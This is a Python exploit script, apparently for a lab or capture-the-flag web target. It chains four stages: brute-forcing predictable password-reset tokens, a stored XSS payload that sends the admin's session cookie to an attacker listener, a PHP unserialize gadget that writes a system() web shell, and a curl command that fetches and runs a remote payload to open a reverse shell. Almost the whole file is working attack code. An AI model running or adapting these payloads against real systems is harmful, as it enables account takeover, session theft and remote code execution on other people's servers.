import IPython
import os
import subprocess
import time
import sys
##################################################################################################
# [Stage 1] - Token can be predicted
# 1. Write a script to /forgotpassword.php
#    To make it more reliable, maybe spam forgotpassword.php for 50 times. This will create 50 tokens
# 2. Upon sending the request, trigger my make_tokens.php
# 3. Now send a request to /resetpassword.php?token={bruteforce}

# With this, I can reset user1 and user2 password
from pwn import *
import http.client
from urllib.parse import urlencode, urljoin
from urllib.parse import quote
from http.cookies import SimpleCookie

host = "172.17.0.2"
proxy_host, proxy_port = "127.0.0.1", 8080
my_ip = "172.17.0.1"
my_port = 8081

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
BOLD = "\033[1m"

def collect_cookies(headers, jar):
    # headers: list of (name, value)
    for k, v in headers:
        if k.lower() == "set-cookie":
            c = SimpleCookie()
            c.load(v)
            for morsel in c.values():
                jar[morsel.key] = morsel.value

def cookie_header(jar):
    return "; ".join(f"{k}={v}" for k, v in jar.items())

cookies = {}

# 1) LOGIN
'''
POST /forgotpassword.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/forgotpassword.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=user1
'''
login_body = urlencode({"username": "user1"})
login_headers = {
    "Host": host,
    "User-Agent": "Python http.client",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": str(len(login_body)),
    "Origin": f"http://{host}",
    "Referer": f"http://{host}/forgotpassword.php",
    "Connection": "keep-alive",
}

conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
# conn = http.client.HTTPConnection(host, 80, timeout=10)
request_target = f"http://{host}/forgotpassword.php"   # absolute-form for proxy

subprocess.Popen(["php", "generateToken.php", "tokens.txt"])
time.sleep(0.5)
conn.request("POST", request_target, body=login_body, headers=login_headers)
resp = conn.getresponse()

# collect cookies from the login response (often a 302)
collect_cookies(resp.getheaders(), cookies)
location = dict((k.lower(), v) for k, v in resp.getheaders()).get("location")
data = resp.read()  # consume body
conn.close()

if b"Email sent!" not in data:
    print("FUCKED")
    sys.exit(1)

print("Resetted")
time.sleep(2)
os.system("cat tokens.txt | uniq > unique.txt")

tokens = []
with open('unique.txt', 'r') as file:
    for line in file:
        tokens.append(line.rstrip())

'''
GET /resetpassword.php?token=WJ2XN37Hz9M4NP7bH9MMgBTDZGYzwKsE HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=0lvcfnig9glqlem2lmavqh5gbc
Upgrade-Insecure-Requests: 1
Priority: u=0, i
'''

valid_token = ''
valid_request = ''
for token in tokens:
    login_headers = {
        "Host": host,
        "User-Agent": "Python http.client",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
    }

    conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
    # conn = http.client.HTTPConnection(host, 80, timeout=10)
    request_target = f"http://{host}/resetpassword.php?token={token}" 
    conn.request("GET", request_target, headers=login_headers)

    print(f"Trying {request_target}...")
    resp = conn.getresponse()
    data = resp.read(10000).decode(errors="replace")
    if "Token is invalid" not in data:
        valid_token = token
        valid_request = request_target
        print(f"Found valid_token {valid_token} !")
        break




'''
POST /resetpassword.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/resetpassword.php?token=buW3Zu4Z7A01FyD7NNUDzPu4bJ9FChhw
Cookie: PHPSESSID=0lvcfnig9glqlem2lmavqh5gbc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

token=buW3Zu4Z7A01FyD7NNUDzPu4bJ9FChhw&password1=password&password2=password
'''
cookies = {}
login_body = urlencode(
                        {
                            "token": valid_token,
                            "password1" : "password",
                            "password2" : "password"
                        }
                    )

login_headers = {
    "Host": host,
    "User-Agent": "Python http.client",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": str(len(login_body)),
    "Origin": f"http://{host}",
    "Referer": f"http://{host}/forgotpassword.php",
    "Connection": "keep-alive",
}

conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
# conn = http.client.HTTPConnection(host, 80, timeout=10)
request_target = f"http://{host}/resetpassword.php"   # absolute-form for proxy

conn.request("POST", request_target, body=login_body, headers=login_headers)
resp = conn.getresponse()
data = resp.read(10000).decode(errors="replace")
print(data)

if "Password changed!" not in data:
    print("Password changed failed")
    sys.exit(1)

print("Password changed successfully")

'''
POST /login.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/login.php
Cookie: PHPSESSID=0lvcfnig9glqlem2lmavqh5gbc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=user1&password=password
'''
login_body = urlencode(
                        {
                            "username": "user1",
                            "password" : "password"
                        }
                    )

login_headers = {
    "Host": host,
    "User-Agent": "Python http.client",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": str(len(login_body)),
    "Origin": f"http://{host}",
    "Connection": "keep-alive",
}

conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
# conn = http.client.HTTPConnection(host, 80, timeout=10)
request_target = f"http://{host}/login.php"   # absolute-form for proxy

conn.request("POST", request_target, body=login_body, headers=login_headers)
resp = conn.getresponse()
data = resp.read(10000).decode(errors="replace")
collect_cookies(resp.getheaders(), cookies)

'''
GET /index.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2/login.php
Connection: keep-alive
Cookie: PHPSESSID=0lvcfnig9glqlem2lmavqh5gbc
Upgrade-Insecure-Requests: 1
Priority: u=0, i
'''
login_headers = {
        "Host": host,
        "User-Agent": "Python http.client",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "Cookie": cookie_header(cookies),
    }

conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
# conn = http.client.HTTPConnection(host, 80, timeout=10)
request_target = f"http://{host}/index.php" 
conn.request("GET", request_target, headers=login_headers)

resp = conn.getresponse()
data = resp.read(10000).decode(errors="replace")

if "Logged in as:" not in data:
    print("Login failed")
    sys.exit(1)

print(f"[+] Login success with cookie {cookie_header(cookies)}")

##################################################################################################

##################################################################################################
# [Stage 2] - XSS when updating profile
# 1. XSS when admin logs in
# 2. Leak cookie
# No escaping of $row htmlentities when printing user
'''
echo '<h4>[Admin Section]</h4>';
echo '<table>';
echo '<tr><th>Uid</th><th>Username</th><th>Password (SHA256)</th><th>Description</th></tr>';
while ($row = pg_fetch_row($ret)) {
    echo '<tr>';
    echo '<td>'.$row[0].'</td>';
    echo '<td>'.$row[1].'</td>';
    echo '<td>'.$row[2].'</td>';
    echo '<td>'.$row[3].'</td>';
    echo '</tr>';
}
echo '</table><br>';
echo '<b>Import user:</b> <br>';
'''

'''
<script>
console.log("AAAAA");
</script>

<script>
fetch('http://172.17.0.1:8082/', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
'''

# XSS payload
'''
POST /profile.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 177
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/profile.php
Cookie: PHPSESSID=0lvcfnig9glqlem2lmavqh5gbc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

description=%3Cscript%3E+fetch%28%27http%3A%2F%2F172.17.0.1%3A8082%2F%27%2C+%7B+method%3A+%27POST%27%2C+mode%3A+%27no-cors%27%2C+body%3Adocument.cookie+%7D%29%3B+%3C%2Fscript%3E
'''

login_body = urlencode(
                        {
                            "description": "<script>fetch('http://172.17.0.1:8082/', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>"
                        }
                    )

login_headers = {
    "Host": host,
    "User-Agent": "Python http.client",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": str(len(login_body)),
    "Cookie": cookie_header(cookies),
    "Origin": f"http://{host}",
    "Connection": "keep-alive",
}

conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
# conn = http.client.HTTPConnection(host, 80, timeout=10)
request_target = f"http://{host}/profile.php"   # absolute-form for proxy

conn.request("POST", request_target, body=login_body, headers=login_headers)
resp = conn.getresponse()
data = resp.read(10000).decode(errors="replace")
print(data)
print(GREEN + "[+] Triggering XSS!" + RESET)

def start_cookie_listener(port):
    """Start listener and extract PHPSESSID from incoming requests"""
    l = listen(int(port))
    print(f"[+] Listening on port {port}")
    conn = l.wait_for_connection()
    print("[+] Got connection!")

    data = conn.recvrepeat(2).decode()  # read request body
    print("[*] Raw request:\n", data)

    # Look for PHPSESSID in the body
    sessid = None
    for line in data.splitlines():
        if line.startswith("PHPSESSID="):
            sessid = line.split("=", 1)[1].strip()
            break

    if sessid:
        print(f"[+] Stolen PHPSESSID: {sessid}")
    else:
        print("[-] No PHPSESSID found in request")

    conn.close()
    return sessid

sessid = start_cookie_listener(8082)

login_headers = {
        "Host": host,
        "User-Agent": "Python http.client",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={sessid}",
    }

conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
# conn = http.client.HTTPConnection(host, 80, timeout=10)
request_target = f"http://{host}/index.php" 
conn.request("GET", request_target, headers=login_headers)
resp = conn.getresponse()
data = resp.read(10000).decode(errors="replace")

if "Hello, admin!" not in data:
    print("Login as admin failed")
    sys.exit(1)

print(data)
print(GREEN + "[+] HELLO ADMIN!" + RESET)




##################################################################################################


##################################################################################################
# [Stage 3] - unserialize arbitrary object
# import a userobj
# O:3:"Log":2:{s:1:"f";s:23:"/var/www/html/index.php";s:1:"m";s:30:"<?php system($_GET['cmd']); ?>";}
# Unserializing this will trigger the Log object __destruct() method, and causing arbitrary write. 
# We can append a reverse shell payload
'''
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $userObj = $_POST['userobj'];
        if ($userObj !== "") {
            $user = unserialize($userObj);
            include('../includes/db_connect.php');
            $ret = pg_prepare($db,
                "importuser_query", "insert into users (username, password, description) values ($1, $2, $3)");
            $ret = pg_execute($db, "importuser_query", array($user->username,$user->password,$user->description));
        }
    }


class Log {
    public function __construct($f, $m) {
        $this->f = $f;
        $this->m = $m;
    }
    
    public function __destruct() {
        file_put_contents($this->f, $this->m, FILE_APPEND);
    }
}
'''

# I see what’s happening. It’s not that your Log class itself is broken — 
# it’s the way unserialize() handles private properties combined with how you created the serialized string.
# unserialize does not do well with private property

'''
POST /admin/import_user.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 195
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/index.php
Cookie: PHPSESSID=0lvcfnig9glqlem2lmavqh5gbc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

userobj=O%3A3%3A%22Log%22%3A2%3A%7Bs%3A1%3A%22f%22%3Bs%3A23%3A%22%2Fvar%2Fwww%2Fhtml%2Findex.php%22%3Bs%3A1%3A%22m%22%3Bs%3A30%3A%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22%3B%7D
'''

login_body = urlencode(
                        {
                            "userobj": 'O:3:"Log":2:{s:1:"f";s:23:"/var/www/html/login.php";s:1:"m";s:30:"<?php system($_GET[\'cmd\']); ?>";}'
                        }
                    )

login_headers = {
        "Host": host,
        "User-Agent": "Python http.client",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(login_body)),
        "Cookie": f"PHPSESSID={sessid}",
        "Connection": "keep-alive",
    }

conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
# conn = http.client.HTTPConnection(host, 80, timeout=10)
request_target = f"http://{host}/admin/import_user.php" 
conn.request("POST", request_target, body=login_body, headers=login_headers)

resp = conn.getresponse()
data = resp.read(10000).decode(errors="replace")

print(GREEN + "[+] ALL DONE?" + RESET)


'''
python3 -m http.server 12346
'''
print(RED + "[!] PYTHON HTTP SERVER AT PORT 12346" + RESET)

##################################################################################################


def start_rev_shell_listener():
    """Start listener that you can interact with"""
    l = listen(12345)
    print(f"[+] Listening on port 12345")
    conn = l.wait_for_connection()
    print(GREEN + "[+] Got connection! Hooray!" + RESET)
    conn.interactive()

# Start in background thread
listener_thread = threading.Thread(target=start_rev_shell_listener, daemon=True)
listener_thread.start()
print("[+] Listener has started!")
time.sleep(2)


command = f"curl http://{my_ip}:12346/exp -o /tmp/exp; chmod +x /tmp/exp; /tmp/exp"
login_headers = {
    "Host": host,
    "User-Agent": "Python http.client",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "keep-alive",
}

conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=10)
request_target = f"http://{host}/login.php?cmd={quote(command)}" 
conn.request("GET", request_target, headers=login_headers)

# resp = conn.getresponse()
# data = resp.read(10000).decode(errors="replace")


print("[+] Enjoy your shell :)")
time.sleep(1000000)



IPython.embed()




##################################################################################################
